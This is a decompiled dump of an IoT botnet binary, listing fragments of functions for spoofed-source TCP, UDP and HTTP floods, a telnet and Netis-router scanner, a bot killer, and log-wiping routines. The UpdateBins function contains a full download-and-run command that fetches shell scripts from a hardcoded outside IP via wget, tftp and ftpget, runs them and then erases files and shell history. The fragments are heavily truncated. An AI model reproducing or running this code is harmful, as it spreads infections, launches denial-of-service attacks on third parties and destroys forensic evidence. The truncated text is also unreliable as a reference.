    int32_t result = getHost(a1, &v140); // 0x804ce3a
    int32_t v142 = socket(2, 3, 6); // 0x804ce67
        return sockprintf(v143, (int32_t)"Failed opening raw socket.");
    if (__GI_setsockopt(v142, 0, 3, (int32_t)&v144, 4) >= 0) {
        GetRandomIP(a6 + 40, v145);
        *v147 = (int16_t)(0x10000 * rand_cmwc(v146) / 0x10000);
        int32_t v148 = rand_cmwc(v146); // 0x804cf7c
                while (true) {
                        int32_t v178 = ((int32_t)(v176 | _strncmp(v163, "rst", 4) % 2 == 0) | v177) ^ 1; // 0x804d096
                                    int32_t v188 = ((int32_t)(v186 | _strncmp(v163, "psh", 4) % 2 == 0) | v187) ^ 1; // 0x804d189
                                        sockprintf(4, (int32_t)"psh");
                                        v172 = "psh";
                                        v172 = "psh";
                rand_cmwc((int32_t)v167);
                    v156 = rand_cmwc((int32_t)v163);
                *v159 = (int16_t)tcpcsum();
                while (true) {
                    __libc_sendto(v155, v144, v139, v140, v141, 0);
                    GetRandomIP(v155, v144);
                    *(int16_t *)(v145 | 4) = (int16_t)(0x10000 * rand_cmwc(v155) / 0x10000);
                    *v149 = rand_cmwc(v155);
                    *v147 = (int16_t)(0x10000 * rand_cmwc(v155) / 0x10000);
                    *v159 = (int16_t)tcpcsum();
        rand_cmwc((int32_t)v163);
            v156 = rand_cmwc((int32_t)v163);
        *v159 = (int16_t)tcpcsum();
        while (true) {
            __libc_sendto(v155, v144, v139, v140, v141, 0);
            GetRandomIP(v155, v144);
            *(int16_t *)(v145 | 4) = (int16_t)(0x10000 * rand_cmwc(v155) / 0x10000);
            *v149 = rand_cmwc(v155);
            *v147 = (int16_t)(0x10000 * rand_cmwc(v155) / 0x10000);
            *v159 = (int16_t)tcpcsum();
        result3 = sockprintf(v143, (int32_t)"Failed setting raw headers mode.");
=================FUNCTION : gethostbyname_r ===================
++++++++ FUNCTION START 35701
++++++++ FUNCTION END 36263
++++++++ FUNCTION LENGTH 562
    int32_t v138 = __get_hosts_byname_r(a1, 2, v135, a4, a5, a6, v137); // 0x8051a49
                            if (inet_aton(v157, a3) != 0) {
                            __open_nameservers();
                            v160 = __dns_lookup(v157, 1, v144, (int32_t)&v143, v159, (int32_t)&v147);
                                    free(v147);
                                        free(v145);
                                        free(v145);
                                free(v147);
                                free(v145);
                                if (inet_aton(v157, a3) != 0) {
                                __open_nameservers();
                                v160 = __dns_lookup(v157, 1, v144, (int32_t)&v143, v159, (int32_t)&v147);
                                        free(v147);
                                            free(v145);
                                            free(v145);
                                    free(v147);
                                    free(v145);
        if (inet_aton(v157, a3) != 0) {
        __open_nameservers();
        v160 = __dns_lookup(v157, 1, v144, (int32_t)&v143, v159, (int32_t)&v147);
                free(v147);
                    free(v145);
                    free(v145);
            free(v147);
            free(v145);
        if (inet_aton(v157, a3) != 0) {
        __open_nameservers();
        v160 = __dns_lookup(v157, 1, v144, (int32_t)&v143, v159, (int32_t)&v147);
                free(v147);
                    free(v145);
                    free(v145);
            free(v147);
            free(v145);
=================FUNCTION : malloc ===================
++++++++ FUNCTION START 38516
++++++++ FUNCTION END 42214
++++++++ FUNCTION LENGTH 3698
                while (true) {
                    while (true) {
                            while (true) {
                                    while (true) {
                                                                                                    free(v249);
                                                                                                free(v249);
                                                                                        free(v249);
                                                                                    free(v249);
                                                                                            free(v249);
                                                                                            free(v249);
                                                                                        free(v249);
                                                                                    free(v249);
                                                                                    free(v249);
                                                                                free(v249);
                                                                        free(v249);
                                                                        free(v249);
                                                                    free(v249);
                                                                            free(v249);
                                                                            free(v249);
                                                                        free(v249);
                while (true) {
                while (true) {
            while (true) {
                                                                    free(v145 + 8);
                                                                    free(v145 + 8);
                                                                free(v145 + 8);
                                                        free(v145 + 8);
                                                        free(v145 + 8);
                                                    free(v145 + 8);
                                                            free(v145 + 8);
=================FUNCTION : sendUDP ===================
++++++++ FUNCTION START 12155
++++++++ FUNCTION END 12507
++++++++ FUNCTION LENGTH 352
        rand_cmwc(2);
    int32_t result = getHost(a1, &v140); // 0x804c93a
        int32_t v142 = socket(2, 2, 17); // 0x804c976
                makeRandomStr(v145, a5);
                while (true) {
                    while (true) {
                        __libc_sendto(v142, v144, a5, 0, (int32_t)&v139, 16);
                                rand_cmwc(v142);
            result2 = sockprintf(v141, (int32_t)"Failed opening raw socket.");
    int32_t v147 = socket(2, 3, 17); // 0x804caad
        if (__GI_setsockopt(v147, 0, 3, (int32_t)&v148, 4) >= 0) {
            int32_t v151 = v150 ^ rand_cmwc(0); // 0x804cb34
            srand(v151);
            init_rand(random());
                v151 = v150 ^ rand_cmwc(0);
                srand(v151);
                init_rand(random());
            GetRandomIP(a5 + 28, v152);
            *v154 = (int16_t)(0x10000 * rand_cmwc(v153) / 0x10000);
                v155 = rand_cmwc(v153);
            makeRandomStr((char *)v157, v138);
            while (true) {
                while (true) {
                    __libc_sendto(v162, (int32_t)&v164, (int32_t)&v164, (int32_t)&v164, (int32_t)&v164, (int32_t)&v164);
                    *v154 = (int16_t)(0x10000 * rand_cmwc(v162) / 0x10000);
                        v165 = rand_cmwc(v162);
                    *(int16_t *)(v152 | 4) = (int16_t)(0x10000 * rand_cmwc(v168) / 0x10000);
                    GetRandomIP(v168, (int32_t)&v164);
            result3 = sockprintf(v141, (int32_t)"Failed setting raw headers mode.");
    result3 = sockprintf(v141, (int32_t)"Failed opening raw socket.");
=================FUNCTION : StartTheLelz ===================
++++++++ FUNCTION START 11081
++++++++ FUNCTION END 11969
++++++++ FUNCTION LENGTH 888
    int32_t v139 = v138 ^ rand_cmwc(0); // 0x804b6b8
    srand(v139);
        while (true) {
        while (true) {
        while (true) {
                case 0: {
                                    socket(0x10000 * v169 / 0x10000, v170, v168);
                                        if (__libc_connect(v170, v168, 0) == -1) {
                        GetRandomPublicIP(v158);
                    socket(0x10000 * v169 / 0x10000, v170, v168);
                case 1: {
                        getsockopt(v164, v163, v179, a1, v175);
                case 2: {
                case 3: {
                    if (__libc_send(v182, v142, v158, (int32_t)&v166) >= 0) {
                        if (__libc_send(v182, v142, v158, (int32_t)&v166) >= 0) {
                case 4: {
                case 5: {
                    if (__libc_send(v184, v145, v142, v158) >= 0) {
                        if (__libc_send(v184, v145, v142, v158) >= 0) {
                case 6: {
                                    get_telstate_host();
                                    sockprintf(v147, v145);
                case 7: {
                    __libc_send(v147, v145, v142, v158);
                    __libc_send(v147, v145, v142, v158);
                    if (__libc_send(v187, v147, v145, v142) >= 0) {
    while (true) {
    while (true) {
=================FUNCTION : prints ===================
++++++++ FUNCTION START 2705
++++++++ FUNCTION END 3192
++++++++ FUNCTION LENGTH 487
                    while (true) {
                        printchar(v140, v139);
                        printchar(v140, v139);
                            printchar(v140, v139);
                    printchar(v140, (int32_t)*a2);
                        printchar(v140, (int32_t)*v145);
                    printchar(v140, v139);
                        printchar(v140, v139);
                printchar(v140, v139);
                    printchar(v140, v139);
            printchar(v140, (int32_t)*a2);
                printchar(v140, (int32_t)*v145);
            printchar(v140, v139);
                printchar(v140, v139);
            while (true) {
                printchar(v140, v139);
                printchar(v140, v139);
                    printchar(v140, v139);
            printchar(v140, (int32_t)*a2);
                printchar(v140, (int32_t)*v145);
            printchar(v140, v139);
                printchar(v140, v139);
        printchar(v140, v139);
            printchar(v140, v139);
    printchar(v140, (int32_t)*a2);
        printchar(v140, (int32_t)*v145);
    printchar(v140, v139);
        printchar(v140, v139);
=================FUNCTION : __read_etc_hosts_r ===================
++++++++ FUNCTION START 66488
++++++++ FUNCTION END 67118
++++++++ FUNCTION LENGTH 630
            if (fgets(v155, v140, v138) != 0) {
                while (true) {
                    __GI_fclose((int16_t *)v140);
                            v148 = __open_etc_hosts();
                            if (fgets(v155, v140, v138) != 0) {
                                while (true) {
                                    __GI_fclose((int16_t *)v140);
                            v148 = __open_etc_hosts();
                            if (fgets(v155, v140, v138) != 0) {
                                while (true) {
                                    __GI_fclose((int16_t *)v140);
    if (fgets(v155, v140, v138) != 0) {
        while (true) {
            while (true) {
                    while (true) {
                            while (true) {
                                        while (true) {
                                            while (true) {
                                                if (__GI_strcasecmp(v154, v181) != 0) {
                                            if (fgets(v155, v140, v138) == 0) {
                                                    if (inet_pton(10, (char *)v184, v142, v161) >= 1) {
                                                            __GI_fclose((int16_t *)v140);
                                                if (inet_pton(2, (char *)v186, (int32_t)v143, v139) >= 1) {
                                                        __GI_fclose((int16_t *)v140);
                                            if (fgets(v155, v140, v138) == 0) {
                                    if (fgets(v155, v140, v138) == 0) {
                                __GI_fclose((int16_t *)v140);
            __GI_fclose((int16_t *)v140);
=================FUNCTION : __open_nameservers ===================
++++++++ FUNCTION START 60468
++++++++ FUNCTION END 61000
++++++++ FUNCTION LENGTH 532
    int32_t v139 = __GI_fopen((int32_t)"/etc/resolv.conf", (int32_t)&v138); // 0x80554f9
        if (fgets(v149, 128, v143) != 0) {
            while (true) {
        __GI_fclose((int16_t *)v140);
    int32_t v152 = __GI_fopen((int32_t)"/etc/config/resolv.conf", (int32_t)&v138); // 0x8055517
    if (fgets(v149, 128, v143) == 0) {
        __GI_fclose((int16_t *)v140);
    while (true) {
            while (true) {
                                while (true) {
                                            while (true) {
                                                while (true) {
                                        while (true) {
                                                if (fgets(v149, 128, v143) == 0) {
                                            while (true) {
                                                free(v191);
                                            __GI_fclose((int16_t *)v140);
                                        while (true) {
                                        if (fgets(v149, 128, v143) == 0) {
                if (fgets(v149, 128, v143) == 0) {
            __GI_fclose((int16_t *)v140);
        if (fgets(v149, 128, v143) == 0) {
    __GI_fclose((int16_t *)v140);
=================FUNCTION : _ppfs_parsespec ===================
++++++++ FUNCTION START 29099
++++++++ FUNCTION END 30183
++++++++ FUNCTION LENGTH 1084
        while (true) {
                while (true) {
                    while (true) {
                            while (true) {
                                            while (true) {
                                                while (true) {
                                                    while (true) {
                                                                    while (true) {
                                                                            while (true) {
                                                                                        while (true) {
                                                                                while (true) {
                                                                while (true) {
                                                                        while (true) {
                                                                                    while (true) {
                                                                                while (true) {
                                                    while (true) {
                                                            while (true) {
                                                                        while (true) {
                                                                    while (true) {
    while (true) {
=================FUNCTION : getOurIP ===================
++++++++ FUNCTION START 18649
++++++++ FUNCTION END 18912
++++++++ FUNCTION LENGTH 263
    int32_t v138 = socket(2, 2, 0); // 0x804ecb8
        inet_addr((int32_t)"8.8.8.8");
        if (__libc_connect(v138, (int32_t)&v139, 16) != -1) {
            int32_t v142 = __GI_getsockname(v138, (int32_t)&v141, (int32_t)&v140); // 0x804ed61
                int32_t v143 = __libc_open("/proc/net/route", 0); // 0x804ed93
                if (fdgets(v145, 0x1000, v143) != 0) {
                    while (true) {
                        if (strstr(v145, "\t00000000\t") == 0) {
                            if (fdgets(v145, 0x1000, v143) == 0) {
                                __libc_close(v143);
                                    __libc_close(v138);
                                __libc_close(v138);
                        __libc_close(v143);
                            __libc_close(v138);
                        __libc_close(v138);
                __libc_close(v143);
                __libc_close(v138);
=================FUNCTION : _stdio_fopen ===================
++++++++ FUNCTION START 25241
++++++++ FUNCTION END 26268
++++++++ FUNCTION LENGTH 1027
                        free(result);
                if (__libc_open((char *)v148, v146) >= 0) {
                                free(v144);
                free(result);
            if (__libc_open((char *)v148, v146) >= 0) {
                                free(v144);
            free(v144);
        if (__libc_open((char *)v148, v146) >= 0) {
            free(v144);
                            free(v144);
        free(result);
=================FUNCTION : getBogos ===================
++++++++ FUNCTION START 5868
++++++++ FUNCTION END 6077
++++++++ FUNCTION LENGTH 209
    int32_t v138 = __libc_open("/proc/cpuinfo", 0); // 0x8048ea1
    if (fdgets(v140, 0x1000, v138) != 0) {
        while (true) {
            uppercase((char *)&v139);
            if (strstr(v140, "BOGOMIPS") != v140) {
                if (fdgets(v140, 0x1000, v138) == 0) {
                while (true) {
                                while (true) {
                                            __libc_close(v138);
    __libc_close(v138);
=================FUNCTION : print ===================
++++++++ FUNCTION START 3438
++++++++ FUNCTION END 3886
++++++++ FUNCTION LENGTH 448
    while (true) {
            printchar((int32_t *)result, v146);
                    while (true) {
                        while (true) {
                                            int32_t v172 = prints(v170, NULL, (int32_t)&v171, (int32_t)&v171); // 0x8048798
                                            int32_t v174 = printi(v173) + result; // 0x8048769
                                        result2 = printi(v169) + result;
                                    result2 = printi(v168) + result;
                                result2 = printi(v167) + result;
                            int32_t v176 = prints((int32_t)v175, (char *)v157, v151, result) + result; // 0x8048685
=================FUNCTION : __uClibc_main ===================
++++++++ FUNCTION START 48762
++++++++ FUNCTION END 49478
++++++++ FUNCTION LENGTH 716
        while (true) {
            v151 = getuid();
            if (v151 == geteuid()) {
                v152 = getgid();
                if (v152 == getegid()) {
    v151 = getuid();
    if (v151 != geteuid()) {
    v152 = getgid();
    if (v152 == getegid()) {
=================FUNCTION : getCores ===================
++++++++ FUNCTION START 6080
++++++++ FUNCTION END 6241
++++++++ FUNCTION LENGTH 161
    int32_t v138 = __libc_open("/proc/cpuinfo", 0); // 0x804905e
    if (fdgets(v140, 0x1000, v138) == 0) {
        __libc_close(v138);
    uppercase((char *)&v139);
    int32_t result = strstr(v140, "BOGOMIPS") == v140;
    while (fdgets(v140, 0x1000, v138) != 0) {
        uppercase((char *)&v139);
        result += (int32_t)(strstr(v140, "BOGOMIPS") == v140);
    __libc_close(v138);
=================FUNCTION : __GI_inet_ntop ===================
++++++++ FUNCTION START 65012
++++++++ FUNCTION END 65537
++++++++ FUNCTION LENGTH 525
        return inet_ntop4(v143, v141, v139);
        while (true) {
                            while (true) {
                                                        v183 = inet_ntop4((int32_t)v145, (int32_t)v160, v159);
                                                v180 = sprintf(v177, (int32_t)"%x", v179, v149);
                                            v183 = inet_ntop4((int32_t)v145, (int32_t)v160, v159);
                                v180 = sprintf(v177, (int32_t)"%x", v179, v149);
                while (true) {
=================FUNCTION : sendHTTP ===================
++++++++ FUNCTION START 13439
++++++++ FUNCTION END 13630
++++++++ FUNCTION LENGTH 191
    random();
    random();
    sprintf(v141, (int32_t)"%s %s HTTP/1.1\r\nConnection: %s\r\nAccept: */*\r\nUser-Agent: %s\r\n", a2, a4);
        while (true) {
            if (__libc_fork(v142) != 0) {
                while (true) {
                    int32_t v143 = socket_connect(a1, a3); // 0x804d641
                        __libc_close(v143);
=================FUNCTION : getcwd ===================
++++++++ FUNCTION START 21173
++++++++ FUNCTION END 21514
++++++++ FUNCTION LENGTH 341
            int32_t v149 = __GI_getpagesize(v148, v140, v138); // 0x804fabb
                v146 = getcwd(v141, v142);
                    free(v139);
        v146 = getcwd(v150, v142);
            free(v139);
    v146 = getcwd(v141, v142);
    free(v139);
=================FUNCTION : sendCNC ===================
++++++++ FUNCTION START 13633
++++++++ FUNCTION END 13796
++++++++ FUNCTION LENGTH 163
    inet_addr(a1);
    int32_t v140 = socket(2, 1, 0); // 0x804d71d
    __libc_connect(v140, (int32_t)&v139, 16);
    __libc_close(v140);
        v140 = socket(2, 1, 0);
        __libc_connect(v140, (int32_t)&v139, 16);
        __libc_close(v140);
=================FUNCTION : negotiate ===================
++++++++ FUNCTION START 8398
++++++++ FUNCTION END 8592
++++++++ FUNCTION LENGTH 194
        __libc_send(a1, v142, 1, 0x4000);
                __libc_send(a1, v142, 1, 0x4000);
                __libc_send(a1, a2 + 2, 1, 0x4000);
            __libc_send(a1, v142, 1, 0x4000);
            __libc_send(a1, a2 + 2, 1, 0x4000);
        __libc_send(a1, v142, 1, 0x4000);
        __libc_send(a1, a2 + 2, 1, 0x4000);
=================FUNCTION : sendSTD ===================
++++++++ FUNCTION START 11972
++++++++ FUNCTION END 12152
++++++++ FUNCTION LENGTH 180
    int32_t v138 = socket(2, 2, 0); // 0x804c7a0
    __GI_gethostbyname(a1);
    while (true) {
        random();
            __libc_send(v138, v148, 65, 0);
            __libc_connect(v138, v141, 16);
                __libc_close(v138);
=================FUNCTION : NetisRanges ===================
++++++++ FUNCTION START 9893
++++++++ FUNCTION END 10044
++++++++ FUNCTION LENGTH 151
    random();
    int32_t v136 = random(); // 0x804b2a3
    int32_t v139 = random(); // 0x804b2bf
    int32_t v142 = random(); // 0x804b2db
    szprintf(v146, (int32_t)"%d.%d.%d.%d", (int32_t)v135, (int32_t)v138);
    return inet_addr(v146);
=================FUNCTION : recvLine ===================
++++++++ FUNCTION START 6401
++++++++ FUNCTION END 6662
++++++++ FUNCTION LENGTH 261
            while (true) {
                sockprintf(v154, (int32_t)"PING");
                while (true) {
                        if (__libc_recv(v154, (int32_t)&v157, 1, 0) != 1) {
        while (true) {
    while (true) {
=================FUNCTION : UpdateBins ===================
++++++++ FUNCTION START 13799
++++++++ FUNCTION END 13953
++++++++ FUNCTION LENGTH 154
    int32_t v139 = __libc_fork(v138); // 0x804d771
    int32_t chars_printed;
        chars_printed = printf("%d\n", v139);
        __libc_system((int32_t)"cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;rm -f *;wget http://207.148.12.91/shitty.sh; chmod 777 shitty.sh; sh shitty.sh; tftp 207.148.12.91 -c get shtftp1.sh; chmod 777 shtftp1.sh; sh shtftp1.sh; tftp -r shtftp2.sh -g 207.148.12.91; chmod 777 shtftp2.sh; sh shtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 207.148.12.91 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf shitty.sh shtftp1.sh shtftp2.sh ftp1.sh; rm -rf *; history -c");
        chars_printed = sleep(20);
    return chars_printed;
=================FUNCTION : memrchr ===================
++++++++ FUNCTION START 58339
++++++++ FUNCTION END 58655
++++++++ FUNCTION LENGTH 316
        while (true) {
            while (true) {
            while (true) {
        while (true) {
        while (true) {
    while (true) {
=================FUNCTION : realloc ===================
++++++++ FUNCTION START 42217
++++++++ FUNCTION END 42669
++++++++ FUNCTION LENGTH 452
        free(result2);
                    free(v141 + 8);
                            free(v141 + 8);
                free(result2);
                    free(v141 + 8);
                free(result2);
=================FUNCTION : fdpclose ===================
++++++++ FUNCTION START 4800
++++++++ FUNCTION END 4994
++++++++ FUNCTION LENGTH 194
        __libc_close(v139);
        __GI_sigprocmask(0, (struct _TYPEDEF_sigset_t *)&v140, (int32_t)&v142);
        while (true) {
            int32_t v145 = __libc_waitpid(v144, (int32_t)&v143, 0); // 0x8048ba6
            __GI_sigprocmask(2, (struct _TYPEDEF_sigset_t *)&v142, 0);
        __GI_sigprocmask(2, (struct _TYPEDEF_sigset_t *)&v142, 0);
=================FUNCTION : sleep ===================
++++++++ FUNCTION START 46673
++++++++ FUNCTION END 46912
++++++++ FUNCTION LENGTH 239
        while (true) {
                    int32_t v144 = __GI_sigprocmask(0, (struct _TYPEDEF_sigset_t *)&v140, v143); // 0x805373b
                        while (true) {
                                    __GI_sigprocmask(2, (struct _TYPEDEF_sigset_t *)&v142, 0);
                                    __GI_sigprocmask(2, (struct _TYPEDEF_sigset_t *)&v142, 0);
                                    __GI_sigprocmask(2, (struct _TYPEDEF_sigset_t *)&v142, 0);
=================FUNCTION : NetisScanner ===================
++++++++ FUNCTION START 13140
++++++++ FUNCTION END 13291
++++++++ FUNCTION LENGTH 151
    while (true) {
        int32_t v140 = socket(2, 2, 17); // 0x804d450
        NetisRanges(0x10000 * htons(0xd0a5) / 0x10000);
        __libc_sendto(v140, (int32_t)"AAAAAAAAnetcore", _strlen("AAAAAAAAnetcore"), 0, v139, 16);
        __libc_sendto(v140, (int32_t)"AA", _strlen("AA"), 0, v139, 16);
        __libc_close(v140);
=================FUNCTION : inet_pton ===================
++++++++ FUNCTION START 64349
++++++++ FUNCTION END 64788
++++++++ FUNCTION LENGTH 439
        result = inet_pton4(v141, v142, v139);
        while (true) {
            while (true) {
                while (true) {
                            if (inet_pton4(v156, (int32_t)v157, v146) >= 1) {
=================FUNCTION : srandom_r ===================
++++++++ FUNCTION START 44930
++++++++ FUNCTION END 45149
++++++++ FUNCTION LENGTH 219
            while (true) {
                    __GI_random_r((int32_t *)a2, (int32_t)&v143);
                        __GI_random_r((int32_t *)a2, (int32_t)&v143);
            __GI_random_r((int32_t *)a2, (int32_t)&v143);
                __GI_random_r((int32_t *)a2, (int32_t)&v143);
=================FUNCTION : printi ===================
++++++++ FUNCTION START 3195
++++++++ FUNCTION END 3435
++++++++ FUNCTION LENGTH 240
            while (true) {
                    printchar((int32_t *)a1, 45);
                    return prints(a1, (char *)v148, v140 - 1, v141) + 1;
        result = prints(a1, (char *)v161, v140, v141);
        result = prints(a1, (char *)&v163, v140, v141);
=================FUNCTION : abort ===================
++++++++ FUNCTION START 43628
++++++++ FUNCTION END 43845
++++++++ FUNCTION LENGTH 217
    while (true) {
                __GI_sigprocmask(1, (struct _TYPEDEF_sigset_t *)&v140, 0);
                while (true) {
                while (true) {
=================FUNCTION : readUntil ===================
++++++++ FUNCTION START 8795
++++++++ FUNCTION END 9031
++++++++ FUNCTION LENGTH 236
        while (true) {
            int32_t v144 = __libc_recv(a1, v143, 1, 0); // 0x8049af0
                        int32_t v147 = __libc_recv(a1, v143 + 1, 2, 0); // 0x8049b31
                    if (strstr(v139, (char *)a2) == 0) {
=================FUNCTION : socket_connect ===================
++++++++ FUNCTION START 10908
++++++++ FUNCTION END 11078
++++++++ FUNCTION LENGTH 170
    if (__GI_gethostbyname(a1) == 0) {
    int32_t result = socket(2, 1, 6); // 0x804b633
    __GI_setsockopt(result, 6, 1, (int32_t)&v138, 4);
    if (__libc_connect(result, (int32_t)&v142, 16) != -1) {
=================FUNCTION : strstr ===================
++++++++ FUNCTION START 32835
++++++++ FUNCTION END 33111
++++++++ FUNCTION LENGTH 276
    while (true) {
    while (true) {
                    while (true) {
            while (true) {
=================FUNCTION : _stdlib_strto_l ===================
++++++++ FUNCTION START 45808
++++++++ FUNCTION END 46345
++++++++ FUNCTION LENGTH 537
        while (true) {
            while (true) {
            while (true) {
        while (true) {
=================FUNCTION : botkiller ===================
++++++++ FUNCTION START 12975
++++++++ FUNCTION END 13137
++++++++ FUNCTION LENGTH 162
    while (true) {
            __libc_system(v138);
            __libc_system(v138);
=================FUNCTION : fflush_unlocked ===================
++++++++ FUNCTION START 30887
++++++++ FUNCTION END 31132
++++++++ FUNCTION LENGTH 245
        _stdio_openlist_dec_use();
    while (true) {
    _stdio_openlist_dec_use();
=================FUNCTION : ClearHistory ===================
++++++++ FUNCTION START 13294
++++++++ FUNCTION END 13436
++++++++ FUNCTION LENGTH 142
    __libc_system((int32_t)"history -c;history -w");
    __libc_system((int32_t)"cd /root;rm -rf .bash_history");
    return __libc_system((int32_t)"cd /var/tmp; rm -f *");
=================FUNCTION : initConnection ===================
++++++++ FUNCTION START 18473
++++++++ FUNCTION END 18646
++++++++ FUNCTION LENGTH 173
        __libc_close(v139);
    int32_t v146 = socket(2, 1, 0); // 0x804ec5c
    return connectTimeout(v146, v137, v144, 30) == 0;
=================FUNCTION : listFork ===================
++++++++ FUNCTION START 8225
++++++++ FUNCTION END 8395
++++++++ FUNCTION LENGTH 170
    int32_t result = __libc_fork(v135); // 0x8049747
        while (true) {
                    free(v142);
=================FUNCTION : connectTimeout ===================
++++++++ FUNCTION START 8025
++++++++ FUNCTION END 8222
++++++++ FUNCTION LENGTH 197
    if (getHost(a2, &v139) != 0) {
    int32_t v140 = __libc_connect(a1, (int32_t)&v138, 16); // 0x8049617
    getsockopt(a1, 1, 4, (int32_t)&v148, (int32_t)&v147);
=================FUNCTION : __GI_fclose ===================
++++++++ FUNCTION START 24587
++++++++ FUNCTION END 24782
++++++++ FUNCTION LENGTH 195
    if (__libc_close(v139) < 0) {
        free(v147);
    _stdio_openlist_dec_use();
=================FUNCTION : sockprintf ===================
++++++++ FUNCTION START 4177
++++++++ FUNCTION END 4325
++++++++ FUNCTION LENGTH 148
    print(&v139, a2, (int32_t)&v141);
    int32_t result = __libc_send(a1, v138, _strlen(v140), 0x4000); // 0x80488c2
    free(v138);
=================FUNCTION : __open_etc_hosts ===================
++++++++ FUNCTION START 66335
++++++++ FUNCTION END 66485
++++++++ FUNCTION LENGTH 150
    int32_t v138 = __GI_fopen((int32_t)"/etc/hosts", (int32_t)&v137); // 0x8056391
        result = __GI_fopen((int32_t)"/etc/config/hosts", (int32_t)&v137);
=================FUNCTION : strcasestr ===================
++++++++ FUNCTION START 33865
++++++++ FUNCTION END 34076
++++++++ FUNCTION LENGTH 211
        while (true) {
            while (true) {
=================FUNCTION : contains_string ===================
++++++++ FUNCTION START 7849
++++++++ FUNCTION END 8022
++++++++ FUNCTION LENGTH 173
    while (true) {
        if (strcasestr((char *)a1, v141) == 0) {
=================FUNCTION : __GI_strspn ===================
++++++++ FUNCTION START 63777
++++++++ FUNCTION END 63972
++++++++ FUNCTION LENGTH 195
    while (true) {
        while (true) {
=================FUNCTION : matchPrompt ===================
++++++++ FUNCTION START 8595
++++++++ FUNCTION END 8792
++++++++ FUNCTION LENGTH 197
    while (true) {
                while (true) {
=================FUNCTION : __malloc_consolidate ===================
++++++++ FUNCTION START 42856
++++++++ FUNCTION END 43142
++++++++ FUNCTION LENGTH 286
        while (true) {
                while (true) {
=================FUNCTION : __stdio_WRITE ===================
++++++++ FUNCTION START 52741
++++++++ FUNCTION END 52961
++++++++ FUNCTION LENGTH 220
    while (true) {
            while (true) {
=================FUNCTION : __GI_sigprocmask ===================
++++++++ FUNCTION START 23516
++++++++ FUNCTION END 23693
++++++++ FUNCTION LENGTH 177
        v139 = sigprocmask(how, set, oset);
    v139 = sigprocmask(how, set, oset);
=================FUNCTION : __GI_fgets_unlocked ===================
++++++++ FUNCTION START 31135
++++++++ FUNCTION END 31353
++++++++ FUNCTION LENGTH 218
            while (true) {
                int32_t v145 = getc_unlocked(); // 0x8051455
=================FUNCTION : rawmemchr ===================
++++++++ FUNCTION START 63541
++++++++ FUNCTION END 63774
++++++++ FUNCTION LENGTH 233
        while (true) {
    while (true) {
=================FUNCTION : __GI_strpbrk ===================
++++++++ FUNCTION START 58831
++++++++ FUNCTION END 59033
++++++++ FUNCTION LENGTH 202
        while (true) {
                while (true) {
=================FUNCTION : __GI_vfprintf ===================
++++++++ FUNCTION START 26909
++++++++ FUNCTION END 27100
++++++++ FUNCTION LENGTH 191
        result = _vfprintf_internal(v141, (char *)a2, a3, v144);
        result = _vfprintf_internal(v140, (char *)a2, a3, v144);
=================FUNCTION : __libc_system ===================
++++++++ FUNCTION START 45333
++++++++ FUNCTION END 45519
++++++++ FUNCTION LENGTH 186
    int32_t v141 = __vfork(v140); // 0x80533c5
    if (wait4(v141, (int32_t)&result, 0, 0) == -1) {
=================FUNCTION : _uintmaxtostr ===================
++++++++ FUNCTION START 53890
++++++++ FUNCTION END 54130
++++++++ FUNCTION LENGTH 240
        while (true) {
    while (true) {
=================FUNCTION : _vfprintf_internal ===================
++++++++ FUNCTION START 27451
++++++++ FUNCTION END 28271
++++++++ FUNCTION LENGTH 820
    while (true) {
                                                                                    while (true) {
=================FUNCTION : __decode_dotted ===================
++++++++ FUNCTION START 67654
++++++++ FUNCTION END 67888
++++++++ FUNCTION LENGTH 234
            while (true) {
                while (true) {
=================FUNCTION : inet_aton ===================
++++++++ FUNCTION START 59036
++++++++ FUNCTION END 59281
++++++++ FUNCTION LENGTH 245
        while (true) {
            while (true) {
=================FUNCTION : _stdio_term ===================
++++++++ FUNCTION START 26560
++++++++ FUNCTION END 26751
++++++++ FUNCTION LENGTH 191
        while (true) {
    while (true) {
=================FUNCTION : makeRandomStr ===================
++++++++ FUNCTION START 6244
++++++++ FUNCTION END 6398
++++++++ FUNCTION LENGTH 154
        rand_cmwc(v138);
            rand_cmwc(v138);
=================FUNCTION : trim ===================
++++++++ FUNCTION START 2346
++++++++ FUNCTION END 2547
++++++++ FUNCTION LENGTH 201
    while (true) {
            while (true) {
=================FUNCTION : __GI_initstate_r ===================
++++++++ FUNCTION START 45152
++++++++ FUNCTION END 45330
++++++++ FUNCTION LENGTH 178
        srandom_r((int64_t)a1, a4);
    srandom_r((int64_t)a1, a4);
=================FUNCTION : _stdio_openlist_dec_use ===================
++++++++ FUNCTION START 30675
++++++++ FUNCTION END 30884
++++++++ FUNCTION LENGTH 209
    while (true) {
                free(v147);
=================FUNCTION : inet_addr ===================
++++++++ FUNCTION START 35405
++++++++ FUNCTION END 35552
++++++++ FUNCTION LENGTH 147
    if (inet_aton((char *)a1, (int32_t)&result) != 0) {
=================FUNCTION : __GI_clock_getres ===================
++++++++ FUNCTION START 50295
++++++++ FUNCTION END 50446
++++++++ FUNCTION LENGTH 151
    int32_t v138 = clock_getres(clk_id, res); // 0x8053de7
=================FUNCTION : __libc_open ===================
++++++++ FUNCTION START 22437
++++++++ FUNCTION END 22593
++++++++ FUNCTION LENGTH 156
    int32_t fd = open(path, 0x1000000 * a2 / 0x1000000); // 0x804fc87
=================FUNCTION : __libc_fork ===================
++++++++ FUNCTION START 21018
++++++++ FUNCTION END 21170
++++++++ FUNCTION LENGTH 152
    int32_t v139 = fork(v138); // 0x804fa75
=================FUNCTION : csum ===================
++++++++ FUNCTION START 10191
++++++++ FUNCTION END 10459
++++++++ FUNCTION LENGTH 268
        while (true) {
=================FUNCTION : wait4 ===================
++++++++ FUNCTION START 51887
++++++++ FUNCTION END 52041
++++++++ FUNCTION LENGTH 154
    int32_t v142 = wait4(v138, v140, v139, v141); // 0x8053ff5
=================FUNCTION : __check_one_fd ===================
++++++++ FUNCTION START 48452
++++++++ FUNCTION END 48606
++++++++ FUNCTION LENGTH 154
    if (__libc_open("/dev/null", v140) != v138) {
=================FUNCTION : GetRandomIP ===================
++++++++ FUNCTION START 10047
++++++++ FUNCTION END 10188
++++++++ FUNCTION LENGTH 141
    return rand_cmwc(v138) & -1 - a1 ^ v138;
=================FUNCTION : __libc_creat ===================
++++++++ FUNCTION START 22596
++++++++ FUNCTION END 22736
++++++++ FUNCTION LENGTH 140
    return __libc_open((char *)a1, 577);
=================FUNCTION : zprintf ===================
